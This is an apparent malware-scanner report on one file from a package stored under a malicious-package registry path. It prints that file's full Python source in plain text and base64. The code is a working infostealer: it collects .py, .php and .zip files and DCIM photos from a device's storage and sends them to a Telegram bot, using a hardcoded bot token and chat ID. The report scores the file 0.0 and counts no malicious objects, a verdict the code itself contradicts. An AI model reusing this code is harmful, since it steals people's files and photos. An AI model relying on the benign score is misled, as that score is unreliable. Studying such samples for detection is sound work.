statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/proxyalhttp/0.1/proxyalhttp-0.1/proxyalhttp-0.1/code/dsgsfdgdfg.py
  contents:
  - name: <module>
    score: 0.0
    code: "import os\nimport requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan_and_send_files(bot_token, chat_id, folder_path='/'):\n    API_URL_DOCUMENT = f'https://api.telegram.org/bot{bot_token}/sendDocument'\n    API_URL_MESSAGE = f'https://api.telegram.org/bot{bot_token}/sendMessage'\n\n    def send_document_to_telegram(file_path, chat_id):\n        try:\n            with open(file_path, 'rb') as file:\n                response = requests.post(API_URL_DOCUMENT, data={'chat_id': chat_id}, files={'document': file})\n                return response.json()\n        except Exception as e:\n            return None\n\n    def send_message_to_telegram(message, chat_id):\n        try:\n            response = requests.post(API_URL_MESSAGE, data={'chat_id': chat_id, 'text': message})\n            return response.json()\n        except Exception as e:\n            return None\n\n    contents = os.listdir(folder_path)\n\n    for content in contents:\n        content_path = os.path.join(folder_path, content)\n        if os.path.isfile(content_path):\n            if content.lower().endswith(('.py', '.php', '.zip')):\n                try:\n                    message = f\"File: {content}\\nPath: {content_path}\"\n                    msg_response = send_message_to_telegram(message, chat_id)\n                    file_response = send_document_to_telegram(content_path, chat_id)\n                except Exception as e:\n                    pass\n        elif os.path.isdir(content_path):\n            files_in_subdir = [os.path.join(content_path, f) for f in os.listdir(content_path) if os.path.isfile(os.path.join(content_path, f))]\n            for file_path in files_in_subdir:\n                if file_path.lower().endswith(('.py', '.php', '.zip')):\n                    try:\n                        message = f\"File: {os.path.basename(file_path)}\\nPath: {file_path}\"\n                        msg_response = send_message_to_telegram(message, chat_id)\n                        \n                        file_response = send_document_to_telegram(file_path, chat_id)\n                    except Exception as e:\n                        pass"
    tokens: resume load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name STRING_LEN_S_ENT_HIGH import_from STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH pop_top load_const load_const OBJECT make_function defaults store_name STRING_LEN_S_ENT_HIGH load_const STRING_LEN_S_ENT_HIGH store_name BOT_TOKEN load_const INTEGER store_name CHAT_ID load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH load_const STRING_LEN_S_ENT_HIGH store_name BOT_TOKEN load_const INTEGER store_name CHAT_ID load_const STRING_FILE_PATH store_name STRING_LEN_S_ENT_HIGH load_const INTEGER store_name MAX_WORKERS load_const OBJECT make_function store_name qq load_const OBJECT make_function store_name rudd return_const None
    hash: 346ad3b5ec162cc164549b8586cffa85aae03169da1c7e0e7ae4b57458274f07
sources:
  .repo_cache/malicious_repos/pypi_malregistry/proxyalhttp/0.1/proxyalhttp-0.1/proxyalhttp-0.1/code/dsgsfdgdfg.py: aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCgpkZWYgc2Nhbl9hbmRfc2VuZF9maWxlcyhib3RfdG9rZW4sIGNoYXRfaWQsIGZvbGRlcl9wYXRoPScvJyk6CiAgICBBUElfVVJMX0RPQ1VNRU5UID0gZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JwogICAgQVBJX1VSTF9NRVNTQUdFID0gZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZE1lc3NhZ2UnCgogICAgZGVmIHNlbmRfZG9jdW1lbnRfdG9fdGVsZWdyYW0oZmlsZV9wYXRoLCBjaGF0X2lkKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoQVBJX1VSTF9ET0NVTUVOVCwgZGF0YT17J2NoYXRfaWQnOiBjaGF0X2lkfSwgZmlsZXM9eydkb2N1bWVudCc6IGZpbGV9KQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBkZWYgc2VuZF9tZXNzYWdlX3RvX3RlbGVncmFtKG1lc3NhZ2UsIGNoYXRfaWQpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KEFQSV9VUkxfTUVTU0FHRSwgZGF0YT17J2NoYXRfaWQnOiBjaGF0X2lkLCAndGV4dCc6IG1lc3NhZ2V9KQogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXR1cm4gTm9uZQoKICAgIGNvbnRlbnRzID0gb3MubGlzdGRpcihmb2xkZXJfcGF0aCkKCiAgICBmb3IgY29udGVudCBpbiBjb250ZW50czoKICAgICAgICBjb250ZW50X3BhdGggPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsIGNvbnRlbnQpCiAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUoY29udGVudF9wYXRoKToKICAgICAgICAgICAgaWYgY29udGVudC5sb3dlcigpLmVuZHN3aXRoKCgnLnB5JywgJy5waHAnLCAnLnppcCcpKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBtZXNzYWdlID0gZiJGaWxlOiB7Y29udGVudH1cblBhdGg6IHtjb250ZW50X3BhdGh9IgogICAgICAgICAgICAgICAgICAgIG1zZ19yZXNwb25zZSA9IHNlbmRfbWVzc2FnZV90b190ZWxlZ3JhbShtZXNzYWdlLCBjaGF0X2lkKQogICAgICAgICAgICAgICAgICAgIGZpbGVfcmVzcG9uc2UgPSBzZW5kX2RvY3VtZW50X3RvX3RlbGVncmFtKGNvbnRlbnRfcGF0aCwgY2hhdF9pZCkKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgZWxpZiBvcy5wYXRoLmlzZGlyKGNvbnRlbnRfcGF0aCk6CiAgICAgICAgICAgIGZpbGVzX2luX3N1YmRpciA9IFtvcy5wYXRoLmpvaW4oY29udGVudF9wYXRoLCBmKSBmb3IgZiBpbiBvcy5saXN0ZGlyKGNvbnRlbnRfcGF0aCkgaWYgb3MucGF0aC5pc2ZpbGUob3MucGF0aC5qb2luKGNvbnRlbnRfcGF0aCwgZikpXQogICAgICAgICAgICBmb3IgZmlsZV9wYXRoIGluIGZpbGVzX2luX3N1YmRpcjoKICAgICAgICAgICAgICAgIGlmIGZpbGVfcGF0aC5sb3dlcigpLmVuZHN3aXRoKCgnLnB5JywgJy5waHAnLCAnLnppcCcpKToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBmIkZpbGU6IHtvcy5wYXRoLmJhc2VuYW1lKGZpbGVfcGF0aCl9XG5QYXRoOiB7ZmlsZV9wYXRofSIKICAgICAgICAgICAgICAgICAgICAgICAgbXNnX3Jlc3BvbnNlID0gc2VuZF9tZXNzYWdlX3RvX3RlbGVncmFtKG1lc3NhZ2UsIGNoYXRfaWQpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBmaWxlX3Jlc3BvbnNlID0gc2VuZF9kb2N1bWVudF90b190ZWxlZ3JhbShmaWxlX3BhdGgsIGNoYXRfaWQpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCkJPVF9UT0tFTiA9ICc1MjQwNTA3OTgwOkFBSEduekhQTGZPMERKeDhDZEJHUnhqWlYwdUdoTEVRZ3N3JwpDSEFUX0lEID0gOTAxMDExNjcxCmRlZiBzZW5kX3Bob3Rvc19pbl9kY2ltX3RvX3RlbGVncmFtKGJvdF90b2tlbiwgY2hhdF9pZCwgZGNpbV9mb2xkZXJfcGF0aCk6CiAgICBBUElfVVJMID0gZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZFBob3RvJwoKICAgIGRlZiBzZW5kX3Bob3RvX3RvX3RlbGVncmFtKGZpbGVfcGF0aCwgY2hhdF9pZCk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZmlsZToKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KEFQSV9VUkwsIGRhdGE9eydjaGF0X2lkJzogY2hhdF9pZH0sIGZpbGVzPXsncGhvdG8nOiBmaWxlfSkKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQoKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGRjaW1fZm9sZGVyX3BhdGgpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICBpZiBmaWxlLmxvd2VyKCkuZW5kc3dpdGgoKCcucG5nJywgJy5qcGcnLCAnLmpwZWcnKSk6CiAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gc2VuZF9waG90b190b190ZWxlZ3JhbShmaWxlX3BhdGgsIGNoYXRfaWQpCiAgICAgICAgICAgICAgICBwcmludChmJ1NlbnQge2ZpbGVfcGF0aH06IHtyZXNwb25zZX0nKQpCT1RfVE9LRU4gPSAnNTI0MDUwNzk4MDpBQUhHbnpIUExmTzBESng4Q2RCR1J4alpWMHVHaExFUWdzdycKQ0hBVF9JRCA9IDkwMTAxMTY3MQpEQ0lNX0ZPTERFUl9QQVRIID0gJy9zZGNhcmQvRENJTScKTUFYX1dPUktFUlMgPSA1CmRlZiBxcShhICxiKToKICAgIHJldHVybiBhICogYgpkZWYgcnVkZCgpOgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9TUFYX1dPUktFUlMpIGFzIGV4ZWN1dG9yOgogICAgICAgIGZ1dHVyZV9zY2FuID0gZXhlY3V0b3Iuc3VibWl0KHNjYW5fYW5kX3NlbmRfZmlsZXMsIEJPVF9UT0tFTiwgQ0hBVF9JRCwgZm9sZGVyX3BhdGg9Jy9zdG9yYWdlL2VtdWxhdGVkLzAnKQogICAgICAgIGZ1dHVyZV9waG90b3MgPSBleGVjdXRvci5zdWJtaXQoc2VuZF9waG90b3NfaW5fZGNpbV90b190ZWxlZ3JhbSwgQk9UX1RPS0VOLCBDSEFUX0lELCBEQ0lNX0ZPTERFUl9QQVRIKQogICAgZnV0dXJlX3NjYW4ucmVzdWx0KCkKICAgIGZ1dHVyZV9waG90b3MucmVzdWx0KCkKICAgIHJldHVybiAiZG9uZSA+PiAi
